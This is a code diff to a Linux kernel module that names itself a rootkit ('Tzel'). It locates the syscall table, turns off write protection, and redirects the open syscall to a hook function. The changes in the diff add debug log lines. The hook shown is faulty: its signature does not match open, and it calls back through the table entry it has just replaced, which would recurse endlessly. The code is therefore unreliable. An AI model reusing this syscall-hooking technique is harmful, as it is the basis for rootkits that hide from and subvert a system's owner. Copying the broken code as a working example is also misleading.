@@ -31,10 +31,16 @@ static inline void protect_memory(void)
 
 static void hook_syscall(unsigned int syscall_num, unsigned long hook)
 {
+    printk(KERN_INFO "Hooking...\n");
+    printk(KERN_INFO "Original address: %lx\n", sys_call_table[syscall_num]);
+    printk(KERN_INFO "Fake address: %lx\n", hook);
+
     unprotect_memory();
     orig_sys_call_table[syscall_num] = sys_call_table[syscall_num];
     sys_call_table[syscall_num] = hook;
     protect_memory();
+
+    printk(KERN_INFO "New address: %lx\n", sys_call_table[syscall_num]);
 }
 
 static void unhook_all(void)
@@ -51,17 +57,17 @@ static void unhook_all(void)
 asmlinkage long sys_open_fake(unsigned int fd)
 {
     long (*orig_open)(unsigned int) = (long (*)(unsigned int))(sys_call_table[__NR_open]);
-    printk(KERN_INFO "HOOKED!!!");
+    printk(KERN_INFO "HOOKED!!!\n");
     
     return orig_open(fd);
 }
 
 static int __init init_rootkit(void)
 {
-    printk(KERN_ALERT "Loading Tzel.\n");
+    printk(KERN_INFO "Loading Tzel.\n");
 
     sys_call_table = (unsigned long *)kallsyms_lookup_name("sys_call_table");
-    printk(KERN_ALERT "sys_call_table address: %px\n", sys_call_table);
+    printk(KERN_INFO "sys_call_table address: %px\n", sys_call_table);
 
     hook_syscall(__NR_open, (unsigned long)sys_open_fake);
 
